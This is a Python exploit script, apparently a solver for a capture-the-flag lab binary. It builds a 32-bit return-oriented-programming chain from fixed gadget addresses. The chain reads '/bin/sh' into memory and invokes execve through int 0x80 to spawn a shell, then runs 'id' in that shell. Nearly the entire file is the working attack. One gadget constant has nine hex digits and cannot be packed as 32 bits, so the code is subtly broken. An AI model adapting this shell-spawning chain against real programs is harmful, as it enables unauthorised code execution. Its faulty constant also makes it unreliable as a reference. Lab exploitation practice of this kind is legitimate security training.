import sys, re, time, subprocess, struct, os
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = "/mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps"
EAX3 = 0x0809dae0
ADD2 = 0x0809da87
ADD3 = 0x0809daa0
POP_EBX = 0x0804901e
POP_ECX = 0x08049a31
POP_EDX = 0x0805848e
INT80 = 0x0805e4b0
XOR_EDX = 0x080493fd3
BSS = 0x080e5000


def p32(x):
    return struct.pack("<I", x)


def build(bss):
    c = b""
    c += p32(EAX3)
    c += p32(POP_EBX) + p32(0)
    c += p32(POP_ECX) + p32(bss)
    c += p32(POP_EDX) + p32(8) + p32(0) + p32(0)
    c += p32(INT80)
    c += p32(XOR_EDX) + p32(0) * 4
    c += p32(EAX3) + p32(ADD2) + p32(ADD3) + p32(ADD3)
    c += p32(POP_EBX) + p32(bss)
    c += p32(POP_ECX) + p32(0)
    c += p32(INT80)
    return b"A" * 28 + c


open(os.path.join(CWD, "flag.txt"), "w").write("academy{LOCAL_TEST}\n")
payload = build(BSS)
print("payload:", len(payload), "0x0a:", b"\n" in payload)
p = subprocess.Popen(["./292_vuln"], cwd=CWD, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT)
p.stdin.write(payload + b"\n")
p.stdin.write(b"/bin/sh\x00")
p.stdin.write(b"echo PWNED_OK; id\n")
p.stdin.flush()
time.sleep(1.0)
try:
    p.stdin.close()
except Exception:
    pass
out = p.stdout.read()
print("=== sortie ===")
print(out.decode("latin-1", "replace")[:600])
